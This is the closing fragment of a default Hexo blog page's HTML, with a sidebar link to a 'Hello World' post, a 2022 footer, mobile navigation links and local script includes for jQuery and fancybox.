            <a href="/2022/08/17/hello-world/">Hello World</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2022 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>